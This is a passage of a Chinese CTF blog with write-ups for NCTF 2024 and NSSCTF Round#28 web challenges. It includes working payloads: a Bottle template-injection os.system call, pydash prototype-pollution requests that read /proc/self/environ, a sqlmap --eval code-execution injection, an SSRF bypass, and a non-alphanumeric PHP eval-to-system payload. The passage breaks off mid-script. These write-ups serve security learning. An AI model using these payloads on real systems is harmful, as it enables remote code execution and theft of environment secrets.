class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"><span class="comment"># 这里会禁掉Python的所有内置函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>看前面的黑名单，预期解应该是打<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">pydash原型链污染</a>，但是没能参考上</p><p>非预期，打<code>Bottle模板注入</code>，上周<code>GHCTF2025</code>刚打过一次，但是过滤了<code>&#123;&#125;.</code>，可以绕一下<code>os.system()</code><br /><code>%</code>开始可以<strong>嵌入python代码执行</strong>，<code>&lt;%xxx%&gt;</code>是嵌入代码块，因为页面没有回显需要重定向，然后文件包含读取(一开始犯病了，想访问<code>/render/1</code>，应该是没有读取权限？然后才想起了<code>include</code>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/render?path=%getattr(__import__(<span class="string">&#x27;os&#x27;</span>), <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;env &gt; 1&#x27;</span>)</span><br><span class="line">/render?path=%include(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里也可以通过<code>/render</code>路由<strong>渲染当前路径下的文件</strong>，<code>?path=1</code></p><p>赛后再来学一下怎么实现<strong>原型链污染</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>这里修复了非预期，为了深入学习一下，参考<a href="https://err0r233.github.io/posts/32411.html">深大爷Err0r233</a><br />我们本地是有下载<code>bottle</code>的，可以在<code>vscode</code>试着跟进源码看看<code>bottle</code>是怎么实现渲染的</p><p>具体原理得细读师傅的文章，这里直接提炼一下</p><p><code>bottle.template</code>可以实现模板文件渲染，<code>template</code>的第一个参数<code>tpl</code>，如果含有<code>\n、&#123;、%、$</code>的能够加入<code>TEMPLATES[tplid]</code>，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而它会根据<code>TEMPLATE_PATH</code>里去找到<br /><code>lookup = kwargs.pop('template_lookup', TEMPLATE_PATH</code></p><p>这里因为过滤了<code>&#123;&#125;</code>，无法直接渲染，我们只能通过污染<code>TEMPLATE_PATH</code>实现任意文件读</p><p><code>pydash.set_(obj,path,value)</code>是可以<strong>修改对象属性</strong>的</p><p>污染的效果是这样<code>setval.__globals__.bottle.TEMPLATE=['/proc/self']</code></p><p>官方这样解释的<code>pydash不允许去修改__globals__属性</code></p><p><code>pydash</code>的版本是<code>8.0.5</code>(也可以通过非预期看一手)，因此不能够直接通过<code>__globals__</code>去获得<code>bottle</code>，在<code>pydash 5.1.2</code>版本中能够使用<code>__globals__</code>，但是高版本下已经被修复了，现在会报<code>access to restricted key __globals__</code>，因此要想办法绕过<code>restricted key</code></p><p>可以发现该异常只有输入在<code>RESTRICTED_KEYS</code><strong>中的内容</strong>时才会触发：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pydash.helpper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</code></p><p>所以，可以通过<code>pydash</code>自己污染掉<code>RESTRICTED_KEYS</code>从而使用<code>globals</code>(这里是因为污染为空，就没有不允许修改<code>__globals__</code>的属性的限制了，之后就可以<strong>自己修改</strong><code>__globals__</code>的属性了)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后再污染<code>TEMPLATE_PATH</code>为<code>/proc/self</code>，我们即可通过<code>/render?path=environ</code>将环境变量渲染出来了</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=setval</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/proc/self&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.16.204:20055/&quot;</span></span><br><span class="line">a1 = requests.post(url+<span class="string">&quot;setValue?name=pydash&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span>, <span class="string">&quot;value&quot;</span>: []&#125;)</span><br><span class="line"></span><br><span class="line">a2 = requests.post(url+<span class="string">&quot;setValue?name=setval&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span>, <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/proc/self&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">a3 = requests.get(url+<span class="string">&quot;render?path=environ&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a3.text)</span><br></pre></td></tr></table></figure><h2 id="sqlmap-master"><a class="markdownIt-Anchor" href="#sqlmap-master"></a> sqlmap-master</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>关键在</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><strong>shell=True参数会让subprocess.call接受字符串类型的变量作为命令，并调用shell去执行这个字符串，当shell=False是，subprocess.call只接受数组变量作为命令，并将数组的第一个元素作为命令，剩下的全部作为该命令的参数</strong></p><p>所以这里不能拼接命令执行了，<code>command.split()</code>，只能利用<code>sqlmap</code>的参数<br /><code>compose.yml</code>告诉我们<code>flag</code>在<strong>环境变量</strong>里面<code>FLAG</code></p><p>emmmm，对<code>sqlmap</code>的参数不太了解，<code>--file-read</code>这些都不行<br />说实话，命令有点多，没翻到<code>--eval</code></p><p>比赛结束后，找到一篇<a href="https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/#sqlmap-master">wp</a>学习一下<br />主要用到了两个参数，还要绕空格(不然参数会被分割)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">eval</span>：动态运行任意的 Python 代码</span><br><span class="line">-c CONFIGFILE：从ini文件中加载选项</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">--eval eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;echo$IFS$FLAG&gt;&gt;114514&#x27;)&quot;)</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>c <span class="number">114514</span></span><br></pre></td></tr></table></figure><p>说实话，真不了解，不愧是<strong>sqlmap-master</strong></p><p>那既然如此，<code>-c</code>能把文件带出来，我们为什么不直接读环境变量呢<br /><code>127.0.0.1 -c /proc/self/environ</code></p><p>诶，看了一下出题人的<a href="https://exp10it.io/2025/03/nctf-2024-web-writeup/">wp</a>，这道题很明显是有回显的啊，可以直接执行<code>env</code><br /><code>127.0.0.1 --eval __import__('os').system('env')</code></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="qrcode-reconstruction"><a class="markdownIt-Anchor" href="#qrcode-reconstruction"></a> QRcode Reconstruction</h2><p>经典二维码修复<br /><img src="https://pic1.zhimg.com/80/v2-e3dce2dc4b1481a7641ed85532c6c157_1440w.png" alt="" /><br />先自己涂上，然后把全部的纠错码擦掉<br /><img src="https://pica.zhimg.com/80/v2-04ba7358595be0e373b888bf579b4a6a_1440w.png" alt="" /><br />选择<br /><img src="https://pica.zhimg.com/80/v2-d50339b7af09d24516fb9fb6847b5afc_1440w.png" alt="" /><br />然后开始<strong>嗯猜flag</strong><br /><img src="https://pica.zhimg.com/80/v2-7067f81c3451be3b59ff1c4c518d640a_1440w.png" alt="" /><br /><strong>NCTF{WeLc0mE_t0_Nctf_2024!!!}</strong><br />直接一把出</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="sign"><a class="markdownIt-Anchor" href="#sign"></a> Sign()</h2><blockquote><p>这是恢复互联网的密钥，密码是实时生成的三万个随机数。</p></blockquote><p>emmmmm，这密码真难看</p><p><a href="https://crystaljiang232.github.io/nctf2024/">一部分官方wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;放在最前面，&lt;a href=&quot;https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh&quot;&gt;laogong的wp&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Ancho</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps</title>
    <link href="https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2025-03-22T08:57:18.000Z</published>
    <updated>2025-03-24T10:02:56.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nssctf-round28"><a class="markdownIt-Anchor" href="#nssctf-round28"></a> NSSCTF Round#28</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="ez_ssrf"><a class="markdownIt-Anchor" href="#ez_ssrf"></a> ez_ssrf</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag在/flag路由中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接绕过<strong>127.0.0.1</strong>的解析，<code>?url=http://0.0.0.0/flag</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0(缺省路由的写法也可以代表0.0.0.0) 0.0.0.0 都代表本地</span><br><span class="line">127.x.x.x 除了.1都行，都是环回地址</span><br></pre></td></tr></table></figure><h3 id="ez_php"><a class="markdownIt-Anchor" href="#ez_php"></a> ez_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>%00</code>进行截断，强比较网上随便找例子或者<code>fastcoll</code>生成，<code>level2.php</code>源码不高亮，得通过<strong>伪协议</strong>读出来(那这里是不是可以直接读<code>flag</code>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/level2.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/?password=123456%00&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># level2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿正则匹配的东西去搜，可以找到，参考<a href="https://exp10it.io/2022/10/2022-hnctf-web-writeup/#challenge__rce">原题</a>构造</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;<span class="string">&#x27;rce&#x27;</span>: <span class="string">&#x27;$_=([].¥)&#123;3&#125;;$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].¥)&#123;2&#125;;$_=_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/level2.php?0=system&amp;1=cat 